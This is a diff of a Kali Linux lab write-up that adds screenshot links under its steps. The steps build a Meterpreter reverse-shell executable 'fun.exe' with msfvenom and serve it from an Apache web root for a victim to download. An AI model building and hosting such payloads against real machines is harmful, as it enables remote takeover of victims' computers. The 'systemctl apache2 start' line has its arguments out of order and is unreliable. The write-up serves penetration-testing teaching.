@@ -25,22 +25,26 @@ Open terminal and try execute some kali linux commands
 
 Find the attackers ip address using ifconfig
 ## OUTPUT:
+<img width="883" height="328" alt="image" src="https://github.com/user-attachments/assets/4e374b43-9b06-45e1-a353-1bcfb8732be8" />
 
 
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
+<img width="880" height="125" alt="image" src="https://github.com/user-attachments/assets/093d3812-2c2a-42ce-8540-c586e17c3a69" />
 
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
+<img width="880" height="125" alt="image" src="https://github.com/user-attachments/assets/ddc6490d-4fa5-4344-b50c-610a8fda59ea" />
 
 
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
 
+<img width="941" height="400" alt="image" src="https://github.com/user-attachments/assets/598fb6fb-9b2c-4279-8703-83351dd24d56" />
 
 Check the status of apache2
 ## OUTPUT:
